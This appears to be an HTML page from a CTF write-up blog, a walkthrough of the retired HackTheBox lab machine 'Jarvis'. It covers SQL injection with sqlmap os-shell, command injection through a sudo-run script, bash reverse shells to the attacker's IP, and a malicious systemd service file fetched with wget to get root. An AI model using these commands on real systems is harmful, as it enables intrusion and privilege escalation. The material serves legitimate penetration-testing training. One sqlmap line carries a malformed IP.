@@ -1,0 +1,113 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Jarvis Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-jarvis-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-01-27T17:31:09+00:00">January 27, 2020</time><time class="updated" datetime="2025-06-27T12:33:58+00:00">June 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">This article is a walkthrough for the retired machine “Jarvis” on Hack the Box. This machine has a static IP address of <strong>10.10.10.143.</strong> Hack the Box is a website to test your hands-on penetration testing on intentionally vulnerable machines.</span></p>
+<p><span style="color: #000000;"><strong>Level: </strong>Easy</span></p>
+<p><span style="color: #000000;"><strong>Task: </strong>find user.txt and root.txt in the victim’s machine.</span></p>
+<h3><span style="color: #800000;">Penetration Methodology</span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Open ports and running services</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Directories enumeration</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Fuzzing to find SQLi</span></li>
+<li><span style="color: #000000;">Exploiting SQLi using SQLmap</span></li>
+<li><span style="color: #000000;">Spawning os-shell in SQLmap</span></li>
+<li><span style="color: #000000;">Getting a meterpreter shell</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Post Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Enumerating sudoers file</span></li>
+<li><span style="color: #000000;">Running simpler.py script as user pepper</span></li>
+<li><span style="color: #000000;">Gaining access to user pepper</span></li>
+<li><span style="color: #000000;">Post exploitation using SUID set on systemctl</span></li>
+<li><span style="color: #000000;">Gaining root access</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Snagging the root flag</strong></span></p>
+<p><span style="color: #000000;">Let’s begin</span></p>
+<h3><span style="color: #800000;">Scanning</span></h3>
+<p><span style="color: #000000;">We used the nmap aggressive scan on our target IP <strong>10.10.10.143 </strong> and observed that ports 22 and 80 were open.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-us6gFne8hGA/Xi8Za08npYI/AAAAAAAAihA/dW0CANpKXh4MjipRpswqAOnUO5W6NXZ5QCLcBGAsYHQ/s1600/1.png"/></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">On moving to the website, we saw a website of some hotel running. The interface was very simple and nothing much could be obtained just by having a look at the source code or even running directory enumeration.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-OGKAKlK8qHQ/Xi8Zc3Zr6gI/AAAAAAAAihQ/PV7MhMA8N481uNf5VJ8DRICh8BH1AuEKACLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;">We then tried jumping tabs and testing OWASP Top 10, and luckily, we found SQL injection on the rooms page.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Ij7HZ9y8Il0/Xi8ZdPIBT6I/AAAAAAAAihY/2wgCHkHcsBEzJ9lynaTlhNtE12Gk1BHyACLcBGAsYHQ/s1600/3.1.png"/></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">The vulnerable parameter was cod. It was obvious then to run sqlmap on this tamperable URL and see what databases were there on the website.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap –u http://10.10.10.143/room.php?cod=1 --dbs --batch</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-gE9JB0-wVGA/Xi8ZdLiXdmI/AAAAAAAAihU/3bnJh9jzddAQ8iKS7SHrPvg67_UotdODwCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">We see 4 databases running on the web application server out of which only one database, i.e, hotels seemed interesting.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Yf7-NkJd-PM/Xi8Zdi3ILUI/AAAAAAAAihc/2myQklkftZMeyXFT9-UVhPIevPpsNeaVwCLcBGAsYHQ/s1600/4.png"/></p>
+<p><span style="color: #000000;">We couldn’t find much here and there in databases so it made us go another way. There is this option in sqlmap called the “os-shell” that tries and spawns a shell of the webserver.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap –u http://10.10.1.0.143/room.php?cod=1 --dbs --os-shell --batch</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-fmrgRQgTpTY/Xi8Zd22ozsI/AAAAAAAAihg/1pyGTEPpBqMpBC11J4zjPkxKAVmbqqv8QCLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">And as expected we landed up with a shell of the server. We confirmed the shell using the command id.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-kPMN0wqScTo/Xi8ZeGjLGLI/AAAAAAAAihk/j7fGZWYoSicIJJrduxd7a5YWWp7tINdyQCLcBGAsYHQ/s1600/6.1.png"/></p>
+<p><span style="color: #000000;">Now we tried to browse to user.txt but the current user didn’t have the permission to read user.txt.</span></p>
+<p><span style="color: #000000;">So, we tried to get access to another user but first, we got out of this really slow and weird os-shell interface using a web_delivery payload and getting a session on meterpreter back.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-fIkJMnzPpL8/Xi8Ze5Pu4rI/AAAAAAAAiho/NgAa_O_ouEYxZeqE2MKDkLswsWhNIrQagCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">We copied this python command onto the os-shell teletype and got a familiar teletype with us.</span></p>
+<p><span style="color: #000000;">While running, we had a need to change the language from <strong>python </strong>to <strong>python3.</strong></span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-JB1pxL3yEtI/Xi8ZfKIY9NI/AAAAAAAAihs/1sWgmaYIQBAN9R7c7PiBHSlD08fRqPg9wCLcBGAsYHQ/s1600/7.png"/></p>
+<h3><span style="color: #800000;">Post Exploitation</span></h3>
+<p><span style="color: #000000;">Once, we got our meterpreter session, we immediately got into shell mode using shell command. Then spawned a pseudo teletype using python one-liner and finally checked sudoers file to find out a script called <strong>simpler.py </strong>that had permissions to run as root.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+sudo -u pepper /var/www/Admin-Utilities/simpler.py</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-3Rm7wHmM2so/Xi8ZfSOh9nI/AAAAAAAAihw/c94BJToiOMwCWtBoYbQis62X7hw8xVDUACLcBGAsYHQ/s1600/8.png"/></p>
+<p><span style="color: #000000;">On running the script, we see that it was simply pinging the IP. On further review of the source code, we found out that a simple OS injection wouldn’t have sufficed because all the characters are blacklisted</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-wGYK2kNuas8/Xi8Zfkw7kQI/AAAAAAAAih0/KIj2iZtukCMx4l9Hh17R6eta-r2CJwh2wCLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;">But we see that $ is not restricted. So, running this script as pepper and running our bash binary inside might give us a shell of the user pepper.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -u pepper /var/www/Admin-Utilities/simpler.py -p $(/bin/bash)
+ls
+ls -al
+id</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-fE233x61BP0/Xi8Zaq5e0kI/AAAAAAAAig4/duLwM7fiCT8M6uh8KqAeLQ6eZ0lCuLZpACLcBGAsYHQ/s1600/11.png"/> </strong></span></p>
+<p><span style="color: #000000;">We tried to run basic commands such as ls, id etc but none of them gave us any output. So, we try to get another shell over netcat using a bash payload</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bash -i &gt;&amp; /dev/tcp/10.10.14.9/1234 0&gt;&amp;1</pre>
+<p><span style="color: #000000;">Here, 10.10.14.9 is my IP.</span></p>
+<p><span style="color: #000000;">Let’s open a netcat listener on another terminal window. This time, the shell was better and we are able to read the user.txt flag.</span></p>
+<p><span style="color: #000000;">Let’s move towards rooting the box.</span></p>
+<p><span style="color: #000000;">The first thing that we tried was to find binaries with SUID bit set.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netcat -lvp 1234
+cat user.txt
+find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-yS0oOgWjFBg/Xi8Za4VTfMI/AAAAAAAAig8/L_WDaiMxS8ULW1uGrgYLg9SEjLPY4QYdwCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">We found systemctl had a SUID bit set. It is fairly evident that if we create a .service file, systemctl would run it as root. Let’s create a service file with name raj.service and add a bash binary in it to be run as root so we get a root bash shell.</span></p>
+<p><span style="color: #000000;">Here is the code of the service file:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">[Unit]
+Description=hacking articles
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.9/8888 0&gt;&amp;1'
+[Install]
+WantedBy=multi-user.target</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-yS0oOgWjFBg/Xi8Za4VTfMI/AAAAAAAAig8/L_WDaiMxS8ULW1uGrgYLg9SEjLPY4QYdwCLcBGAsYHQ/s1600/12.png"/></p>
+<h4><span style="color: #800000;">Gaining root access</span></h4>
+<p><span style="color: #000000;">In this service file, ExecStart command was going to give us a root shell on a netcat reverse listener set up at port 1234. We set up netcat listener and downloaded and this raj.service file in the victim’s system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.14.9:8000/raj.service
+/bin/systemctl enable /home/pepper/raj.service
+/bin/systemctl start raj</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-oDWW6t5SYSY/Xi8Zbwdp4lI/AAAAAAAAihI/5Q78zcW_a5YCGU1QhY0ywnPAdXdSgNR1wCLcBGAsYHQ/s1600/15.png"/></p>
+<p><span style="color: #000000;">On our listener, we were successfully able to get a reverse shell and voila! We got root.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 8888
+cd /root
+cat root.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-hlj_z9Haesk/Xi8ZcNocN1I/AAAAAAAAihM/D2qJNxBNmoII5g0jfjRfzH9YZ1z9txcGQCLcBGAsYHQ/s1600/16.png"/></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;">We snagged the flag and that’s how we got root access to the system. It was a well-balanced lab and there was a lot of new learning. There were no unnecessary exploit development and hence, we’d rate this as <strong>intermediate.</strong></span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
